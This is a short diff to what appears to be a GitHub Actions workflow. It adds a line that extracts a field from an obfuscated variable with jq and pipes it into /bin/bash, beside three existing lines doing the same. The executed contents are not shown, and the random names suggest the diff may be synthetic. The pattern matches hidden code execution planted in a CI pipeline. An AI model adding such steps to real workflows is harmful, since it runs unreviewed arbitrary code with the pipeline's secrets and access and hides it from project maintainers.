@@ -38,6 +38,7 @@ jobs:
           echo $ulw8 | jq -r .aptkl93 | /bin/bash
           printf '%s' "$gxo644" | jq -r .v7302 | /bin/bash
           printf '%s' "$a80525" | jq -r .hxh9 | /bin/bash
+          printf '%s' "$s83" | jq -r .sn4643 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
